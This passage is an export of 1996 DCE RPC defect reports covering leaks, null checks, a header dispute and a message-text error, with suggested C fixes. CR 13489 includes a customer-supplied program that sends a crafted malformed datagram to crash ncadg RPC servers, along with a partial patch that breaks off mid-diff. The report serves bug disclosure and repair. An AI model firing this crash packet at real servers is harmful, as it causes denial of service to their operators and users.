Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : nsbndexp.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
In rpc_ns_binding_export, line 525 (?) of nsbndexp.c calls rpc__ns_uuid_from_uuid
to generate uuid_p, which is then passed to rpc__nsuuid_mbr_add.  If that fails
the code does not a goto CLEANUP, without calling rpc__nsuuid_free.  It should
call rpc__nsuuid_free before checking the status from rpc__nsuuid_mbr_add.
============================================================================
add the following after rpc__nsuuid_mbr_add in rpc_ns_binding_export:
if (*status != rpc_s_ok) {
    unsigned21 temp_status;
    rpc__nsuuid_free (&nsuuid_p, &temp_slatus);
    goto CLEANUP;
}

[10/11/96 public]

unsigned21? I think this is a typo. Fixed in 1.1 maintenance.



CR Number                     : 13600
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : callers of rpc_ss_get_support_ptrs need to check for NULL
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : nidlalfr.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
Anyone that calls rpc_ss_get_support_ptrs needs to check for a returned
null pointer before they go off trying to lock the associated mutex.
In rpc_ss_allocate there's actually code to check this, 
In addtion, rpc_ss_free should also do the same check.  This caused
a codre dump.
=================================================================== 
The fixes in rpc_ss_allocate (nidlalfr.c):
add the following after rpc_ss_get_support_ptrs( &p_support_ptrs );
if (p_support_ptrs == NULL)
    return(NULL);

The fixes in rpc_ss_free (nidlalfr.c) (nidlalfr.c):
add the following after rpc_ss_get_support_ptrs( &p_support_ptrs ); 
if (p_support_ptrs == NULL)
    return(NULL);

[10/14/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13599
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : RPC_MEM_ALLOC fail when looking at acl via softlink
Reported Date                 : 8/16/96
Found in Baseline             : 1.1
Found Date                    : 8/16/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : rpc/runtime/nsentry.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/16/96 public]
"/.:/s1" is a CDS softlink to "/.:/subsys/realms/JACOBDOM/servers/JACOB"
when I execute:
dcecp -c acl show /.:/s1/f:/to/to.acl
I get the following error:
...FATAL roc mem D:\U\BUILD\BUILD\SRC\RPC\RUNTIME\RPCMEM.C 619 0xffb27b8 msg#=0x16c9a167 (RPC_MEM_ALLOC) memory allocation failed.

-------------------------------------------------------------------------------
I would like to put the fixed function rpc_ns_entry_inq_resolution as following:

PUBLIC void rpc_ns_entry_inq_resolution
#ifdef _DCE_PROTO_
(
    unsigned32          entry_name_syntax,
    unsigned_char_p_t   entry_name,
    unsigned_char_p_t   *resolved_name,
    unsigned_char_p_t   *unresolved_name,
    unsigned32          *status
)
#else
(entry_name_syntax, entry_name, resolved_name, unresolved_name, status)
unsigned32          entry_name_syntax;
unsigned_char_p_t   entry_name;
unsigned_char_p_t   *resolved_name;
unsigned_char_p_t   *unresolved_name;
unsigned32          *status;
#endif
{
    rpc_nsentry_p_t nsentry;
    unsigned_char_t partial_results [RPC_C_ENTRY_NAME_MAX];
    unsigned32      new_entry_name_syntax,
                    partial_results_length,
                    residual_length,
                    rtn_status;
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 18535 */
    unsigned_char_p_t nsentry_name_p;
    unsigned_char_p_t prev_sep_p;
#endif
    CODING_ERROR (status);
    RPC_NS_VERIFY_INIT ();


    /*
     * Set output values to NULL in case of failure.
     */

    if (resolved_name != NULL)
    {
        *resolved_name = NULL;
    }

    if (unresolved_name != NULL)
    {
        *unresolved_name = NULL;
    }

    /*
     * Resolve name syntax
     */
    new_entry_name_syntax = entry_name_syntax;
    RPC_RESOLVE_SYNTAX (new_entry_name_syntax, status);
    if (*status != rpc_s_ok)
    {
        return;
    }

    /*
     * Convert entry name to a name service representation.
     * This puts it in its expanded form.
     */
    nsentry = rpc__nsentry_from_entry
        (new_entry_name_syntax, entry_name, status);

    if (*status != rpc_s_ok)
    {
        return;
    }

    /*
     * Call rpc__nsattr_read_resolution to see if the name
     * resolves by reading our group attribute.
     */
    rpc__nsattr_read_resolution (nsentry, RPC_C_ATTR_GROUP,
        partial_results, &partial_results_length, &rtn_status);

    if (rtn_status == rpc_s_entry_not_found)
    {
        rtn_status = rpc_s_partial_results;
    }

    if ((rtn_status == rpc_s_ok) ||
        (rtn_status == rpc_s_partial_results))
    {
        /*
         * Heap allocation storage for the resolved portion of the name
         * and copy the results only if the user wants it.
         */
        if (resolved_name != NULL)
        {
            RPC_MEM_ALLOC (
                *resolved_name,
                unsigned_char_p_t,
                partial_results_length+1,
                RPC_C_MEM_STRING,           /* CMVC 14960 */
                RPC_C_MEM_WAITOK);

            strcpy ((char *) *resolved_name, (char *)partial_results);
        }
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 18535 */
        if ((rtn_status == rpc_s_partial_results) &&
           ((signed32)partial_results_length > strlen ((char *)nsentry->name)))
 /* softlink entry name */
        {

            /* resolving non-junction portion of softlink entryname */

            nsentry_name_p = nsentry->name;
            prev_sep_p = NULL;
            while((rtn_status != rpc_s_ok) && nsentry_name_p)
            {
               nsentry_name_p = (unsigned_char_p_t)strrchr( (char *)nsentry->name, '/'); /* CMVC 21932 */
               memset((char *) nsentry_name_p, 0, 1); /* temp terminate */
               if (prev_sep_p != NULL)
                   memset((char *) prev_sep_p, '/', 1); /* restore previous separator */
               nsentry->name_length = (unsigned32)strlen((const char *)(nsentry->name)) + 1;

               /*
                * Call rpc__nsattr_read_resolution to see if the name
                * resolves by reading our group attribute.
                */
               rpc__nsattr_read_resolution ((rpc_nsentry_p_t)nsentry, RPC_C_ATTR_GROUP,
                   partial_results, &partial_results_length, &rtn_status);

               prev_sep_p = nsentry_name_p;  /* save the previous separator */
            }
            rtn_status = rpc_s_partial_results; /* restored    CMVC 22040 */
            memset((char *) prev_sep_p, '/', 1); /* restore previous separator */
            nsentry->name_length = (unsigned32)strlen((const char *)(nsentry->name)) + 1; /* restore */
            residual_length = strlen ((char *) (prev_sep_p + 1));      /* CMVC 21932 */
            /*
             * Heap allocate storage and copy that portion of the name
             * which could not be resolved only if user wants it.
             */
            if (unresolved_name != NULL)
            {
                RPC_MEM_ALLOC (
                    *unresolved_name,
                    unsigned_char_p_t,
                    residual_length+1,
                    RPC_C_MEM_STRING,
                    RPC_C_MEM_WAITOK);

                strcpy ((char *) *unresolved_name,
                        (char *) prev_sep_p + 1);
            }
        }
        else
        {                                                              /* CMVC 21932 */
#endif        /* CMVC 18535 */

        /*
         * Now extract the portion of the entry name that was not resolved.
         */
        residual_length =
            strlen ((char *)nsentry->name) - partial_results_length;

        /*
         * If there is a residual, skip over the separator so we
         * return a relative name.
         */
        if (residual_length > 0)
        {
            residual_length--;
            partial_results_length++;
        }

        /*
         * Heap allocate storage and copy that portion of the name
         * which could not be resolved only if user wants it.
         */
        if (unresolved_name != NULL)
        {
            RPC_MEM_ALLOC (
                *unresolved_name,
                unsigned_char_p_t,
                residual_length+1,
                RPC_C_MEM_STRING,        /*   CMVC 14960 */
                RPC_C_MEM_WAITOK);

            strcpy ((char *) *unresolved_name,
                    (char *) nsentry->name + partial_results_length);
        }
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 21932 */
        }
#endif      /* CMVC 21932 */
    }

    /*
     * Free the name-service entry representation.
     */
    rpc__nsentry_free (&nsentry, status);

    /*
     * Return the results from the read_resolution operation unless
     * nsentry_free failed.
     */
    if (*status == rpc_s_ok)
    {
        *status = rtn_status;
    }

    return;
}

[10/14/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13598
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Undefined structure in external header files (Borland)
Reported Date                 : 8/16/96
Found in Baseline             : 1.1
Found Date                    : 8/16/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : rpc/sys_idl/idl_es.h
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/16/96 public]
make the following change in idl_es.h
 *
 * "idl_es_handle_t was defined as a pointer to "struct idl_es_handle_s_t"
 * which is defined in /export/power/usr/include/dce/ideddefs.h .
 * "idlddefs.h" includes "idl_es.h" but not vice versa -- a bizzard style.
 * So when an application includes "idl_es.h" but not "idlddefs.h", the
 * compiler will generate a undefined structure message.
 *
 * IDLDDEFS_H is defined in "idlddefs.h", so if an application includes this
 * file, it can still access the structure "idl_es_handle_t".
 * But if an application includes "idl_es.h" only, "idl_es_handle_t" just looks
 * like an opaque pointer to it.
 *
 */

#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 19644 */ 
#ifdef IDLDDEFS_H
#endif   /* CMVC 19644 */

typedef struct idl_es_handle_s_t *idl_es_handle_t;
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 19644 */


#else
typedef void *idl_es_handle_t;
#endif
#endif   /* CMVC 19644 */

[08/16/96 public]
This sounds like a work-around for a Borland C compiler bug.
Things like
	typedef struct foo *foo_handle;
are common, and legal, in C.  Is the Borland compiler complaining about
this?  IT shouldn't.

The "bizzard" [sic] style is a good way to write code:  the internal,
implementation, header file, includes the external, public, interfaces.

Unless I'm misunderstanding, this defect should be cancelled.

---------------------------------------------------------------------------
Since an application included <idl_es.h>, which did not have struct
definition of idl_es_handle_s_t, the compiler normally will
complain if it had the variable referring to this struct,
like "typedef struct idl_es_handle_s_t *idl_es_handle_t;".
Now idlddefs.h included idl_es.h and also had a struct idl_es_handle_s_t
defined.  Therefore, if an applicaion wants to refer to this structure
it should either include idlddefs.h or like the fix described.


I would like to hear more comments from you.  Thanks!

[08/20/96 public]
Sorry, but you're wrong.
>Since an application included <idl_es.h>, which did not have struct
>definition of idl_es_handle_s_t, the compiler normally will
>complain if it had the variable referring to this struct,
>like "typedef struct idl_es_handle_s_t *idl_es_handle_t;".

If your compiler is doing this, then your compiler has a bug.  Or at
least it is an annoying feature that should be turned off.  Pointers to
incomplete types are legal C, and useful for "data hiding."

The DCE code is correct.  This defect should be cancelled.



CR Number                     : 13597
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : ptrs are not freed when per-thread context destroyed
Reported Date                 : 8/16/96
Found in Baseline             : 1.1
Found Date                    : 8/16/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : alfrsupp.c eenodtbl.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/16/96 public]
make the following change in rpc_ss_set_thread_handl in alfrsupp.c:
 
    if ( helper_thread_indirection_ptr != NULL )
    {
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 15190 */

        if (helper_thread_indirection_ptr->free_referents)
        {
            rpc_ss_thread_support_ptrs_t *p_thread_support_ptrs;

            p_thread_support_ptrs = helper_thread_indirection_ptr->indirection;

            /* Release any memory owned by the memory handle */
            rpc_ss_mem_free( p_thread_support_ptrs->p_mem_h );

            /*
             *  Free the objects it points at.
             *  Must cast because instance_of
             *  (rpc_ss_thread_support_ptrs_t).p_mem_h
             *  is of type rpc_mem_handle, which is a pointer to volatile,
             *  and free() doesn't take a pointer to volatile.
             */
            free( (idl_void_p_t)p_thread_support_ptrs->p_mem_h );
            RPC_SS_THREADS_MUTEX_DELETE( &(p_thread_support_ptrs->mutex) );

            /* Free the structure */
            free( p_thread_support_ptrs );
        }
endif  /* CMVC 15190 */


        free( helper_thread_indirection_ptr );
    }

==========================================================================
make the following change in rpc_ss_build_indirection_struct in eenodtbl.c
    if ( helper_thread_indirection_ptr != NULL )
    {
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 15190 */
        if (helper_thread_indirection_ptr->free_referents)
        {
            rpc_ss_thread_support_ptrs_t *old_thread_support_ptrs;

            old_thread_support_ptrs = helper_thread_indirection_ptr->indirectio;

            /* Release any memory owned by the memory handle */
            rpc_ss_mem_free( old_thread_support_ptrs->p_mem_h );

            /*
             *  Free the objects it points at.
             *  Must cast because instance_of
             *  (rpc_ss_thread_support_ptrs_t).p_mem_h
             *  is of type rpc_mem_handle, which is a pointer to volatile,
             *  and free() doesn't take a pointer to volatile.
             */
            free( (idl_void_p_t)old_thread_support_ptrs->p_mem_h );
            RPC_SS_THREADS_MUTEX_DELETE( &(old_thread_support_ptrs->mutex) );

            /* Free the structure */
            free( old_thread_support_ptrs );
        }
#endif   /* CMVC 15190 */

        free( helper_thread_indirection_ptr );
    }

[10/14/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13579
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl marshalling/unmarshalling
Short Description             : varying arrays limited to a double
byte size (65536). AES states 4 byte size. This discrepancy cause illegal state
Reported Date                 : 7/26/96
Found in Baseline             : 1.1
Found Date                    : 7/26/96
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/26/96 public]

An illegal state occurs when using tcp in the perf multi-threaded
test with a 1meg data (actually it occurs in sizes > 65536*4).   
The receiver thread keeps the call_rep state
in a "request" state until the last fragment is sent.  The unmarhaller
then reads the buffers according to the size of the array set by the client.
In the perf testcase, however, the server unmarshaller
calculates the byte_size incorrectly since the number of elements
sent by the client is limited to a unsigned short. Therefore the server
reads very little of the data before proceeding into the manager,
marshaller and transmit phases.  The transmit phase is the cn call state
killer since the receiver thread has not received the last fragment,therefore,
the state of the call_rep is "request". Once the transmit phase invokes a
"response" event an illegal state occurs as show below:

1996-05-20-22:18:05.070-05:00I----- PID#87 FATAL rpc cn_state D:\U\BUILD\BUILD
RC\RPC\RUNTIME\CNSCLSM.C 3097 0x012605a8 msgID=0x16C9A148
Illegal state transition detected in CN server call state machine [cur_state:
5, cur_event: 101, call_rep: 11b3c10]


To reproduce the problem, use the perf testcase with the following commands:

Server:

server 1 ncacn_ip_tcp

Client:

client -m1 1 ncacn_ip_tcp:hostname[2001] 1 1 n n 1000000 



To fix this problem I changed the marshaller and unmarshaller runtime
code to use unsigned long instead of unsigned short. The problem with
this fix is that both the client and server need the changes even if the
size of the varying array is actually within 65536. In other
words, suppose the client does not have the change. The client will therefore
marshall and send the size in a double byte format. The server with the
fix will then read and unmarshall 4bytes. Two of these bytes will be incorrect
,thereby, corrupting the size intended by the client.



CR Number                     : 13534
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : misc unitialized memory references leaks in rpc runtime
Reported Date                 : 6/20/96
Found in Baseline             : 1.1
Found Date                    : 6/20/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : nsbndexp.c nslookup.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/20/96 public]

There were some small leaks/ uninitialized memory accesses in the rpc runtime.

rpc_ns_binding_export was leaking memory
Here's a delta that fixes the leak:

Change: rpc/runtime/nsbndexp.c from 12.2 to 12.5
*** rpc/runtime/nsbndexp.c
***************
*** 232,237 ****
--- 241,247 ----
      RPC_NS_VERIFY_INIT ();
  
      binding_vec_copy = NULL;
+     nsentry = NULL;
  
***************
*** 303,315 ****
      RPC_RESOLVE_SYNTAX (name_syntax, status);
      if (*status != rpc_s_ok)
      {
!         return;
      }
  
      nsentry = rpc__nsentry_from_entry (name_syntax, entry_name, status);
      if (*status != rpc_s_ok)
      {
!         return;
      }
  
      /*
--- 312,324 ----
      RPC_RESOLVE_SYNTAX (name_syntax, status);
      if (*status != rpc_s_ok)
      {
!         goto CLEANUP;
      }
  
      nsentry = rpc__nsentry_from_entry (name_syntax, entry_name, status);
      if (*status != rpc_s_ok)
      {
!         goto CLEANUP;
      }
  
      /*
***************
*** 320,326 ****
          (*status != rpc_s_entry_already_exists))
      {
          rpc__nsentry_free (&nsentry, &temp_status); 
!         return; 
      }
  
      /*
--- 329,335 ----
          (*status != rpc_s_entry_already_exists))
      {
          rpc__nsentry_free (&nsentry, &temp_status); 
!         goto CLEANUP; 
      }
  
      /*
***************
*** 438,444 ****
          rpc_binding_vector_free (&binding_vec_copy, &temp_status);
      }
  
!     rpc__nsentry_free (&nsentry, &temp_status); 
  
      return;
  
--- 448,457 ----
          rpc_binding_vector_free (&binding_vec_copy, &temp_status);
      }
  
!     if (nsentry != NULL)
!     {
!       rpc__nsentry_free (&nsentry, &temp_status); 
!     }
  
      return;
  

There were two uninitialized memory reads in nslookup.  Here is a delta
that fixes the problem:

Change: rpc/runtime/nslookup.c from 12.1 to 12.5
*** rpc/runtime/nslookup.c
***************
*** 3062,3070 ****
           * current member element - if they're equal, check their
           * predecessors.  If predecessors are equal too, report a cycle
           */
!         if ((memcmp ((char *) (nsentry->name), 
                  (char *) (lookup_member->name->name),
!                 nsentry->name_length)) == 0)
          {
              /*
               * get the predecessor of the non_leaf_list node -
--- 3081,3090 ----
           * current member element - if they're equal, check their
           * predecessors.  If predecessors are equal too, report a cycle
           */
!         if ((lookup_member->name->name_length == nsentry->name_length) &&
!             ((memcmp ((char *) (nsentry->name),
                  (char *) (lookup_member->name->name),
!                 nsentry->name_length)) == 0))
          {
              /*
               * get the predecessor of the non_leaf_list node -
***************
*** 3089,3097 ****
                   * first element) with the matching non_leaf node's
                   * predecessor.
                   */
!                 if ((memcmp ((char *)last_non_leaf_member->name->name,
                          (char *) (prev_lookup_member->name->name),
!                         last_non_leaf_member->name->name_length)) == 0)
                  {
                      *status = rpc_s_cycle_detected;
                      return (true);
--- 3109,3119 ----
                   * first element) with the matching non_leaf node's
                   * predecessor.
                   */
!                 if ((last_non_leaf_member->name->name_length ==
!                     prev_lookup_member->name->name_length) &&
!                     ((memcmp ((char *)last_non_leaf_member->name->name,
                          (char *) (prev_lookup_member->name->name),
!                         last_non_leaf_member->name->name_length)) == 0))
                  {
                      *status = rpc_s_cycle_detected;
                      return (true);
***************
*** 2337,2343 ****
      rpc_tower_ref_p_t       tower_ref;
      rpc_nsentry_p_t         nsentry_name,
                              nsentry_inq;
!     boolean                 got_obj_uuid;
      unsigned32              temp_status;
          
  
--- 2344,2350 ----
      rpc_tower_ref_p_t       tower_ref;
      rpc_nsentry_p_t         nsentry_name,
                              nsentry_inq;
!     boolean                 got_obj_uuid=false;
      unsigned32              temp_status;



CR Number                     : 13490
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : doc
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : prob_gd
Short Description             : pdg text for
rpc_s_no_more_elements is wrong
Reported Date                 : 6/3/96
Found in Baseline             : 1.2.1
Found Date                    : 6/3/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : prob_gd/prob_gd/messages.gpsml
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/3/96 public]

The following description in the online problem determination guide
is wrong:

     Code: 0x16c9a0a7 rpc_s_no_more_elements
           Severity: Varies
           Component: rpc
           Text: No more profile elements
           Explanation: No more profile  elements  are  found  in  the
           profile  lookup.   This is usually not reported through the
           API.
           Action: Report the error to your vendor.

This is a documented return code for rpc_ns_profile_elt_inq_next
(see the man page).

[6/4/96 public]

I'm assigning this to HP since the fix has to be made in the RPC
sams file. This is in fact a code bug, not a doc bug, since the
sams file lies in the code tree and is owned by the developers.
I can fix the text in any given version of the PDG, but that won't
fix the real problem.



CR Number                     : 13489
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13631
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpc/runtime/dglsn.c
Short Description             : bad packet crashes any ncadg
server except(rpcd/dced)
Reported Date                 : 6/1/96
Found in Baseline             : 1.0.3, 1.1
Found Date                    : 6/1/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/1/96 public]

A support customer reported the following:
==========================================

DCE: 1.0.3 and 1.1
Problem Description:
        A bad packet ( see attachment ) can crash any server exporting
        ncadg ( except rpcd/dced ). This program crashed DCE rpc servers
        running on 1.0.3 and 1.1 machines AIX, HP and NT regardless.


        RPC runtime does not check the validity of the address family
        in forwarded packets, much less that the forwarded packet 
        originated on the local machine. See attachment for a partial
        fix to this issue/ diff of rpc/runtime/dglsn.c

Test case:
        Compile and run the attached program after removing WSA... calls.

--=====================_830209947==_
Content-Type: text/plain; charset="us-ascii"
Content-Disposition: attachment; filename="badpkt.c"


unsigned char pkt[]  =
{
0x04,
0x00,
0x01,
0x00,
0x10,
0x00,
0x00,
0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0xDC,0xD2,0xCC,0x35,0x00,0x00,0x00,0x00,0x0D,0x00,0x00,0xC3,0x66,0x00,0x00,0x00,
0xF0,0x62,0x66,0x00,0xE1,0xE1,0x17,0x17,0x83,0x37,0x00,0x00,0xC0,0xE2,0x6F,0x5F,
0x00,0x00,0x00,0x00,
0x01,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,
0x00,0x00,
0xFF,0xFF,
0xFF,0xFF,
0x00,0x00,
0x00,0x00,
0x00,
0x00,
0x10,0x00,0x00,0x00,
0x10,0x00,
0x00,0x00,0x02,0x00,0x08,0xC7,
0xC0,0x5C,0x6E,0xCE,
0x00,0x00,0x68,0xE3,0x0B,0xFF,0xC0,0x00
} ;


/*  Simple mail client to do smtp */
#define DEBUG  
#ifdef DEBUG 
#define dprintf(arg) printf("%s\n", arg)
#define dfmtprintf(args) printf(args)
#else
#define dprintf(arg)
#define dfmtprintf(args) 
#endif

#define xabort() { if ( d != -1 ) (void)closesocket(d); \
			(void)WSACleanup() ; abort () ; }
#define MYHOSTNAME "nehru"
#define LOCALPORT 0
#define MYUSERNAME "bhandaru"


#include <sys/types.h> 
#include <winsock.h>
#include <windows.h>


int usage ()
{
  exit(0);
}
int main ( int argc, char **argv )
{

 /* Usage: prog host port  <<EOF
    message
	EOF
  */
   char *pHost;
   unsigned short dport;
   struct sockaddr_in lsin, rsin;
   int  d = -1;
   int r;
   struct in_addr rinaddr, linaddr;
   WSADATA wsd;
   struct hostent *hp;
#define NSZ 100
   char myname[NSZ];
   int rsinlen, rlen;

   pHost = argv[1];
   dport = (unsigned short) atoi(argv[2]);

   WSAStartup(0x0101, &wsd);
   (void)memset(&rsin,0,sizeof(rsin));
   (void)memset(&lsin,0,sizeof(lsin));

   d = socket(AF_INET, SOCK_DGRAM, 0);
   if ( d == SOCKET_ERROR )  {
        (void)printf("Last error: %d\n", WSAGetLastError() );
	xabort ();
   }
   dprintf("Opened socket");

   hp = gethostbyname(pHost);
   if (!hp) xabort();
   rinaddr.s_addr = *(u_long *)hp->h_addr_list[0] ;
   dprintf("Got remote host addr");
   (void)printf("Addr: %s\n ", inet_ntoa(rinaddr));

   gethostname(myname, sizeof(myname));
   hp  = gethostbyname(myname);
   if (!hp) xabort ();
   linaddr.s_addr = *(u_long *)hp->h_addr_list[0] ;
   dprintf("Got local host addr");

   lsin.sin_family = AF_INET ;
   lsin.sin_addr = linaddr;
   lsin.sin_port = htons(LOCALPORT);
   if ( bind ( d, (struct sockaddr *)&lsin, sizeof(lsin)) == SOCKET_ERROR ) {
        (void)printf("Addr: %s Last error: %d\n", inet_ntoa(linaddr), 
				WSAGetLastError() );
		xabort ();
   }
   dprintf("Bound local address");
   
   rsin.sin_family = AF_INET ;
   rsin.sin_addr = rinaddr;
   rsin.sin_port = htons(dport);

   if (sendto(d,pkt,sizeof(pkt), 0, (struct sockaddr*)&rsin, sizeof(rsin))
	== SOCKET_ERROR ) {
        (void)printf("Addr: %s Last error: %d\n", inet_ntoa(linaddr), 
				WSAGetLastError() );
		xabort ();
   }
   Sleep(3000);
   rsinlen = sizeof(rsin);
   if ( rlen = 0 && (rlen = recvfrom(d,pkt,sizeof(pkt),0, (struct sockaddr*)&rsin, &rsinlen))
	 == SOCKET_ERROR ) {
        (void)printf("Addr: %s Last error: %d\n", inet_ntoa(linaddr), 
				WSAGetLastError() );
		xabort ();
   }
/*For now*/
#define print_bytes(p,l) printf("%30s\n", p)

   if ( rlen > 0 ) {
     print_bytes(pkt,rlen);
   }

   (void)closesocket(d);
   WSACleanup();
   return 0;
}

--=====================_830209947==_
Content-Type: text/plain; charset="us-ascii"
Content-Disposition: attachment; filename="diff.log"

===================================================================
RCS file: H:\dce32_rcs\src\rpc\runtime\dglsn.c,v
retrieving revision 1.10.1.4
diff -c -r1.10.1.4 c:\wk\sb\src\rpc\runtime\dglsn.c
*** C:/temp\T0002109	Mon Apr 22 13:42:10 1996
--- c:\wk\sb\src\rpc\runtime\dglsn.c	Mon Apr 22 11:43:04 1996
***************
*** 1709,1715 ****
      rpc__dg_convc_indy(&cas_uuid);
  }
  
! 
  
  /*
   * R E C V _ P K T
--- 1715,1737 ----
      rpc__dg_convc_indy(&cas_uuid);
  }
  
  
  /*
   * R E C V _ P K T
***************
*** 1851,1856 ****
--- 1873,1894 ----
       * checksumming), copy the header out if the boot time is zero.
       */
  
+ 
+     /* Another minor sanity check. If this packet length is less
+      * than the sizeof header, we have a problem. Lets avoid it - nb
+      */
+     if ( rqe->pkt_len < sizeof(rqe->hdr) ) {
+         RPC_DBG_GPRINTF(("(recv_pkt) pkt size (%d) too small \n", 
+ 				rqe->pkt_len));
+         rqe->frag_len = 0;
+         rqe->hdrp = NULL;
+         return (0);
+     }
+ 
      rqe->hdrp = (rpc_dg_pkt_hdr_p_t) &rqe->pkt->hdr;
  
      if (NDR_DREP_INT_REP(rqe->hdrp->drep) != ndr_g_local_drep.int_rep)
***************
*** 1895,1900 ****
--- 1933,1939 ----
  
      if (fwd)
      {
+ 
          /*
           * Clear forwarding bits in packets that shouldn't have them.  Pre-2.0
           * systems accidentally set them as a result of initializing its
***************
*** 1925,1930 ****
--- 1964,2010 ----
               * request packet processing handle them.  (All two-packet
               * forwards are requests.)
               */
          }
  
          else 
***************
*** 1934,1950 ****
--- 2014,2064 ----
              unsigned16 i, j;
              unsigned16 fwd_len;
          
+ 	/* Another sanity check. If this packet length is less
+      	 * than the sizeof fhdr, we have a problem. Lets avoid it - nb
+      	 */
+     	if ( rqe->pkt_len < 
+ 		  (sizeof(rpc_dg_pkt_hdr_t)+sizeof(rpc_dg_fpkt_hdr_t))) {
+         	RPC_DBG_GPRINTF(("(recv_pkt) forwarded pkt size (%d) too small \n", 
+ 					rqe->pkt_len));
+         	rqe->frag_len = 0;
+         	rqe->hdrp = NULL;
+         	return (0);
+     	}
              /*
               * Jam the source address and drep from the top of the body into
               * the right places, then slide the real body up.  The proceed
               * as if none of this nightmare had happened.
               */
  
              rqe->from.len = fpkt->fhdr.len;
              *sp = fpkt->fhdr.addr;
              rqe->hdrp->drep[0] = fpkt->fhdr.drep[0];
              rqe->hdrp->drep[1] = fpkt->fhdr.drep[1];
              rqe->hdrp->drep[2] = fpkt->fhdr.drep[2];
              fwd_len = rqe->pkt_len - 
                  (RPC_C_DG_RAW_PKT_HDR_SIZE + sizeof(rpc_dg_fpkt_hdr_t));
              rqe->frag_len -= sizeof(rpc_dg_fpkt_hdr_t);
***************
*** 1965,1971 ****
--- 2079,2139 ----
  
              rqe->pkt->hdr.hdr[RPC_C_DG_RPHO_FLAGS] &= ~RPC_C_DG_PF_FORWARDED;
          }
+ 
+     /* NOTE:
+ 	    Forwarded packets must be local. We must guard against
+ 	    some one sending us a bad forwarded packet that can
+ 	    have us branch off into oblivion by feeding us bad
+ 	    naf_id. In order to do this, it would be nice if
+ 	    naf implementation(comnaf) provided a way to verify
+ 	    if the address is local. To my knowledge that does
+ 	    not exist. Here we fix it quick and dirty but will
+ 	    make us impermeable to this kind of attack. - nb
+ 	 */
+     if (fwd) {  
+        struct sockaddr *sp;
+ 
+ 	 sp = (RPC_DG_HDR_FLAG2_IS_SET(rqe->hdrp, RPC_C_DG_PF2_FORWARDED_2))?
